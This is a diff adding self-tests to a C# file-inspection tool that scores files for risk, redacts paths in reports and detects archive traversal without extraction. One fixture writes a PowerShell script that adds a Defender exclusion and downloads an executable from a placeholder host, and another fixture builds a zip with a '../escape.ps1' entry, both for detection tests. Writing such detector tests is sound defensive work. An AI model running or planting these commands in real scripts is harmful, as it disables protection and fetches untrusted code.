@@ -1,6 +1,8 @@
 using System.Buffers.Binary;
 using System.IO;
 using System.IO.Compression;
+using System.Security.Cryptography;
+using System.Text.Json;
 
 namespace DestinyBlackBox;
 
@@ -84,6 +86,16 @@ internal static class ProductSelfTest
             Require(report.Contains($"{posture.ReinforcementEnforcedCount}/{posture.ReinforcementCount} active on this system", StringComparison.Ordinal), ref checks);
             Require(!report.Contains("C:\\Users\\", StringComparison.OrdinalIgnoreCase), ref checks);
             Require(TestGuardedReportReplacement(result), ref checks);
+
+            Require(FileInspector.IsActiveContentExtension(".EXE"), ref checks);
+            Require(FileInspector.IsActiveContentExtension(".ps1"), ref checks);
+            Require(FileInspector.IsActiveContentExtension(".LnK"), ref checks);
+            Require(TestRiskBands(), ref checks);
+            Require(TestReportOmitsAbsolutePathAndSanitizesCells(), ref checks);
+            Require(TestTextInspectionHashesWithoutExecuting(), ref checks);
+            Require(TestScriptCapabilitiesRaiseReview(), ref checks);
+            Require(TestArchiveFindingsWithoutExtraction(), ref checks);
+            Require(TestCanceledInspectionReadsNothing(), ref checks);
             return new ProductSelfTestResult(true, checks);
         }
         catch
@@ -105,6 +117,172 @@ internal static class ProductSelfTest
         !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Requests") &&
         !NetworkIsolationGuard.IsBlockedAssemblyName(null) &&
         !NetworkIsolationGuard.IsBlockedAssemblyName("PresentationCore");
+
+    /// <summary>Locks the documented score bands and the clamp that keeps a score inside 0–100.</summary>
+    private static bool TestRiskBands()
+    {
+        var high = new FileAnalysis();
+        high.Indicators.Add(new Indicator("danger", "one", "ja", "en", 80));
+        high.Indicators.Add(new Indicator("danger", "two", "ja", "en", 80));
+
+        var review = new FileAnalysis();
+        review.Indicators.Add(new Indicator("watch", "review", "ja", "en", 25));
+
+        var low = new FileAnalysis();
+        low.Indicators.Add(new Indicator("info", "low", "ja", "en", 0));
+
+        return high.RiskScore == 100 &&
+               high.RiskCode.Equals("HIGH", StringComparison.Ordinal) &&
+               review.RiskCode.Equals("REVIEW", StringComparison.Ordinal) &&
+               low.RiskCode.Equals("LOW", StringComparison.Ordinal);
+    }
+
+    /// <summary>
+    /// Keeps the absolute target path out of both report formats and keeps table-breaking and
+    /// control characters out of the Markdown cells while the JSON keeps the sanitized name.
+    /// </summary>
+    private static bool TestReportOmitsAbsolutePathAndSanitizesCells()
+    {
+        var result = new ScanResult
+        {
+            TargetPath = @"C:\Users\Private\secret.ps1",
+            TargetName = "secret.ps1",
+            StartedAt = new DateTime(2026, 8, 6, 9, 0, 0, DateTimeKind.Local),
+            Duration = TimeSpan.FromSeconds(1)
+        };
+        result.Files.Add(new FileAnalysis
+        {
+            FullPath = result.TargetPath,
+            RelativePath = "folder|name`\r\n.ps1",
+            Size = 12,
+            Sha256 = new string('A', 64),
+            FileType = "Script / active text"
+        });
+
+        string markdown = ReportBuilder.Build(result, "en");
+        string json = ReportBuilder.BuildJson(result, "en");
+        using JsonDocument document = JsonDocument.Parse(json);
+
+        return markdown.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
+               json.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
+               markdown.Contains("folder/name'\uFFFD\uFFFD.ps1", StringComparison.Ordinal) &&
+               document.RootElement.GetProperty("schema").GetString() is "pc-black-box-report-v2" &&
+               document.RootElement.GetProperty("files")[0].GetProperty("path").GetString()
+                   is "folder|name`\uFFFD\uFFFD.ps1";
+    }
+
+    /// <summary>
+    /// Inspects an ordinary text file and confirms the reported digest is the digest of the bytes on
+    /// disk, so the evidence comes from reading the target rather than from running it.
+    /// </summary>
+    private static bool TestTextInspectionHashesWithoutExecuting() =>
+        WithFixtureDirectory(directory =>
+        {
+            string path = Path.Combine(directory, "notes.txt");
+            File.WriteAllText(path, "ordinary text");
+
+            ScanResult result = Inspect(path);
+            if (result.Files.Count != 1) return false;
+
+            FileAnalysis file = result.Files[0];
+            return file.RelativePath.Equals("notes.txt", StringComparison.Ordinal) &&
+                   file.FileType.Equals("Text", StringComparison.Ordinal) &&
+                   file.Sha256.Equals(
+                       Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(path))),
+                       StringComparison.Ordinal) &&
+                   result.RiskCode.Equals("CLEAR", StringComparison.Ordinal);
+        });
+
+    /// <summary>Locks the capability findings and the resulting band for a script that reads as active content.</summary>
+    private static bool TestScriptCapabilitiesRaiseReview() =>
+        WithFixtureDirectory(directory =>
+        {
+            string path = Path.Combine(directory, "admin.ps1");
+            File.WriteAllText(
+                path,
+                "Add-MpPreference -ExclusionPath C:\\Temp\nInvoke-WebRequest https://example.invalid/tool.exe");
+
+            ScanResult result = Inspect(path);
+            if (result.Files.Count != 1) return false;
+
+            FileAnalysis file = result.Files[0];
+            return file.Indicators.Any(indicator => indicator.Code.Equals("defender-change", StringComparison.Ordinal)) &&
+                   file.Indicators.Any(indicator => indicator.Code.Equals("remote-download", StringComparison.Ordinal)) &&
+                   file.RiskCode.Equals("REVIEW", StringComparison.Ordinal);
+        });
+
+    /// <summary>
+    /// Reports an escaping path and active content inside an archive from the central directory alone:
+    /// nothing is extracted, so the escaping entry must not appear next to the archive.
+    /// </summary>
+    private static bool TestArchiveFindingsWithoutExtraction() =>
+        WithFixtureDirectory(directory =>
+        {
+            string archivePath = Path.Combine(directory, "sample.zip");
+            using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
+            {
+                using var writer = new StreamWriter(archive.CreateEntry("../escape.ps1").Open());
+                writer.Write("Write-Output safe-test");
+            }
+
+            ScanResult result = Inspect(archivePath);
+            if (result.Files.Count != 1) return false;
+
+            FileAnalysis file = result.Files[0];
+            return file.Indicators.Any(indicator => indicator.Code.Equals("archive-traversal", StringComparison.Ordinal)) &&
+                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-active-content", StringComparison.Ordinal)) &&
+                   !File.Exists(Path.Combine(directory, "escape.ps1")) &&
+                   !File.Exists(Path.Combine(Path.GetDirectoryName(directory)!, "escape.ps1"));
+        });
+
+    /// <summary>Confirms an already-canceled inspection ends without opening the target.</summary>
+    private static bool TestCanceledInspectionReadsNothing() =>
+        WithFixtureDirectory(directory =>
+        {
+            string path = Path.Combine(directory, "cancel.txt");
+            File.WriteAllText(path, "not read");
+            using var cancellation = new CancellationTokenSource();
+            cancellation.Cancel();
+
+            try
+            {
+                Inspect(path, cancellation.Token);
+                return false;
+            }
+            catch (OperationCanceledException)
+            {
+                return true;
+            }
+        });
+
+    private static ScanResult Inspect(string targetPath, CancellationToken cancellationToken = default) =>
+        new FileInspector().ScanAsync(targetPath, null, cancellationToken).GetAwaiter().GetResult();
+
+    /// <summary>
+    /// Runs one check inside a private temporary directory and removes that directory afterwards. The
+    /// directory is created by this process, so no caller-supplied target is inspected.
+    /// </summary>
+    private static bool WithFixtureDirectory(Func<string, bool> check)
+    {
+        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
+        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
+        Directory.CreateDirectory(directory);
+        try
+        {
+            return check(directory);
+        }
+        finally
+        {
+            try
+            {
+                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
+                {
+                    Directory.Delete(directory, recursive: true);
+                }
+            }
+            catch { }
+        }
+    }
 
     private static FileAnalysis CreateFile(
         string relativePath,
